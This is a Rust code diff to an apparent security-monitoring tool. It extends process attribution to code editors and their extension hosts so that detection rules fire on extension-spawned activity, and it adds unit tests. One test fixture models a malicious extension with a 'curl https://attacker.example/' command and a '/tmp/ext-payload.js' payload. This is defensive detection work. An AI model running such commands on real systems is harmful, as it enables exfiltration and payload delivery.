@@ -32,8 +32,17 @@ use serde::{Deserialize, Serialize};
 /// `/proc` reads can't stall the drain task.
 pub const MAX_CHAIN_DEPTH: usize = 32;
 
+/// Recognised attribution roots: the high-level tool whose subtree
+/// produced the event. Historically these were strictly package
+/// managers (npm, cargo, …); v0.38 added editor binaries (`code`,
+/// `cursor`, …) so extension-spawned syscalls attribute back to the
+/// editor process and downstream rules (persistence-write,
+/// cloud-secret-egress, IOC scanner) light up against extension
+/// activity for free. The type name is a legacy of the original
+/// scope — the field is semantically "attribution root", not
+/// strictly a package manager.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
-#[serde(rename_all = "lowercase")]
+#[serde(rename_all = "kebab-case")]
 pub enum PackageManager {
     Npm,
     Pnpm,
@@ -48,6 +57,21 @@ pub enum PackageManager {
     Gradle,
     Bundler,
     Composer,
+    /// VS Code (Microsoft build), Code - OSS, VSCodium — same
+    /// `code` argv[0] basename. Includes extension host children.
+    VscodeEditor,
+    /// `code-server` — Coder's browser-served VS Code.
+    CodeServer,
+    /// Anysphere's Cursor editor.
+    Cursor,
+    /// Codeium's Windsurf editor.
+    Windsurf,
+    /// Electron renderer / extension-host helper. On macOS the
+    /// VS Code extension host process exec's as
+    /// `Code Helper (Plugin)` — basename `Code Helper`. On Linux
+    /// it shows up as `code` again, so this variant is primarily
+    /// the macOS path.
+    CodeHelper,
 }
 
 impl PackageManager {
@@ -75,6 +99,17 @@ impl PackageManager {
             "gradle" => Self::Gradle,
             "bundle" | "bundler" => Self::Bundler,
             "composer" => Self::Composer,
+            "code" => Self::VscodeEditor,
+            "code-server" => Self::CodeServer,
+            "cursor" => Self::Cursor,
+            "windsurf" => Self::Windsurf,
+            // Match the macOS extension-host basename. The
+            // trim_version_suffix pass leaves embedded spaces and
+            // parentheses untouched, so both
+            // "Code Helper" and "Code Helper (Plugin)" reach us
+            // here; check by prefix to cover the (Renderer) /
+            // (GPU) / (Plugin) variants uniformly.
+            s if s.starts_with("Code Helper") => Self::CodeHelper,
             _ => return None,
         };
         Some(pm)
@@ -95,6 +130,11 @@ impl PackageManager {
             Self::Gradle => "gradle",
             Self::Bundler => "bundler",
             Self::Composer => "composer",
+            Self::VscodeEditor => "vscode",
+            Self::CodeServer => "code-server",
+            Self::Cursor => "cursor",
+            Self::Windsurf => "windsurf",
+            Self::CodeHelper => "vscode-extension-host",
         }
     }
 }
@@ -460,6 +500,67 @@ mod tests {
         assert_eq!(trim_version_suffix("npm"), "npm");
         // All-digit name — leave alone (we'd otherwise return "")
         assert_eq!(trim_version_suffix("123"), "123");
+    }
+
+    #[test]
+    fn from_argv0_recognises_editor_binaries() {
+        assert_eq!(
+            PackageManager::from_argv0("code"),
+            Some(PackageManager::VscodeEditor)
+        );
+        assert_eq!(
+            PackageManager::from_argv0("/usr/share/code/code"),
+            Some(PackageManager::VscodeEditor)
+        );
+        assert_eq!(
+            PackageManager::from_argv0("code-server"),
+            Some(PackageManager::CodeServer)
+        );
+        assert_eq!(
+            PackageManager::from_argv0("cursor"),
+            Some(PackageManager::Cursor)
+        );
+        assert_eq!(
+            PackageManager::from_argv0("windsurf"),
+            Some(PackageManager::Windsurf)
+        );
+        assert_eq!(
+            PackageManager::from_argv0("Code Helper"),
+            Some(PackageManager::CodeHelper)
+        );
+        assert_eq!(
+            PackageManager::from_argv0("Code Helper (Plugin)"),
+            Some(PackageManager::CodeHelper)
+        );
+        assert_eq!(
+            PackageManager::from_argv0("Code Helper (Renderer)"),
+            Some(PackageManager::CodeHelper)
+        );
+    }
+
+    #[test]
+    fn attribute_walks_chain_from_extension_host_to_vscode() {
+        // pid 500 (curl invoked by malicious extension) ← 499
+        // (node extension-host child) ← 498 (Code Helper Plugin)
+        // ← 497 (code). The first attribution root we hit walking
+        // up is Code Helper, so that's what the event is stamped
+        // with — exactly the "this came from an extension" signal
+        // persistence-write / cloud-secrets / IOC rules gate on.
+        let mut f = FakeLookup::default();
+        f.add(500, Some(499), "curl", "curl https://attacker.example/");
+        f.add(499, Some(498), "node", "node /tmp/ext-payload.js");
+        f.add(
+            498,
+            Some(497),
+            "Code Helper (Plugin)",
+            "Code Helper (Plugin)",
+        );
+        f.add(497, Some(1), "code", "/usr/share/code/code");
+        f.add(1, None, "init", "/sbin/init");
+
+        let a = attribute(500, &f, &[]).expect("event pid is readable");
+        assert_eq!(a.package_manager, Some(PackageManager::CodeHelper));
+        assert_eq!(a.root_argv.as_deref(), Some("Code Helper (Plugin)"));
     }
 
     #[cfg(target_os = "linux")]
